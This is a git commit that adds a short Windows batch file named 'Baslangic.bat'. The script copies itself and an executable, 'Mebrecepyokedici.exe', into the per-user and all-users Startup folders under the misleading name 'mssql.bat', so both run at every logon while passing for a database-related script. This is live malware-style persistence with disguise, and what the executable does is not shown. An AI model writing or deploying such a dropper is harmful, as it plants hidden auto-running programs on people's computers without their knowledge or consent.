d0ec1a9a961362aaca7727cccff3105cd1af73aa
satrancistanbul <97613229+satrancistanbul@users.noreply.github.com>
2023-04-05 19:40:23 +0300

    Add files via upload

---
+++ Baslangic.bat
@@ -0,0 +1,5 @@
+copy Baslangic.bat "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mssql.bat"
+copy Baslangic.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\mssql.bat"
+copy Mebrecepyokedici.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\mssql.bat"
+copy Mebrecepyokedici.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\mssql.bat"
+pause
